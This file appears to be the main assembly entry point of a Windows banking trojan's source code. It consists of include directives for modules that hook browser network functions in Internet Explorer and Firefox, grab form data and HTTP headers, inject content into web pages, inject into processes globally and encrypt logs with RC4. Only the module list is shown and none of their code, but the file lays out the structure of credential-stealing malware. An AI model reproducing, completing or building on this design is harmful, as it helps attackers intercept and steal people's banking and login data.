
.code

;; ==================================================================================================== ;;
;;                                                                                                      ;;
;; ==================================================================================================== ;;

	include windows.inc

	include kernel32.inc
	include advapi32.inc
	include user32.inc
	includelib kernel32.lib
	includelib advapi32.lib
	includelib user32.lib

	include macro.inc


@CODE_START:

	ifdef DEBUGMODE
	include DEBUG.ASM
	endif


	include INJECTED.ASM
	include API\APITable.inc
	include API\RestoreAPIs.inc
;	include Install\Install.inc
	include Install\GlobalInject.inc


	include API\Catchy32.inc
	include API\HookAPI.inc

	include Func\Array.inc
	include Func\FileRead.inc

	include Init\InitArr.inc
	include Init\InitCfg.inc
	include Init\InitHooks.inc

	include Logs\InLog.inc
	include Logs\Notify.inc
	include Crypt\Crypt.inc
	include Crypt\rc4.inc

	include Strings\atodw.inc
	include Strings\dwtoa.inc
	include Strings\dwtoh.inc
	include Strings\htodw.inc
;	include Strings\ltrim.inc
	include Strings\strcpyn.inc
	include Strings\StrIPos.inc
	include Strings\StrIPosEx.inc
	include Strings\StrIMaskMatch.inc

	include TrCntrl\Compare.inc
	include TrCntrl\GetInject.inc
	include TrCntrl\IsGrabTerm.inc
	include TrCntrl\WebInject.inc

	include TrCntrl\IE\GrabIEHeaders.inc
	include TrCntrl\IE\InternetStatusCallback.inc
	include TrCntrl\IE\hInternetCloseHandle.inc
	include TrCntrl\IE\hHttpSendRequestW.inc
	include TrCntrl\IE\hInternetQueryDataAvailable.inc
	include TrCntrl\IE\hInternetReadFile.inc
	include TrCntrl\IE\hHttpQueryInfoA.inc
;	include TrCntrl\IE\hInternetReadFileExA.inc
;	include TrCntrl\IE\hHttpSendRequestExW.inc
;	include TrCntrl\IE\hInternetWriteFile.inc
;	include TrCntrl\IE\hHttpEndRequestA.inc

	include TrCntrl\FF\CheckEOF.inc
	include TrCntrl\FF\FFWebInject.inc
	include TrCntrl\FF\FixHeaders.inc
	include TrCntrl\FF\FixChunk.inc
	include TrCntrl\FF\FixLen.inc
	include TrCntrl\FF\GrabBrief.inc
	include TrCntrl\FF\hPR_Write.inc
	include TrCntrl\FF\hPR_Read.inc
	include TrCntrl\FF\hPR_Close.inc

@CODE_END:

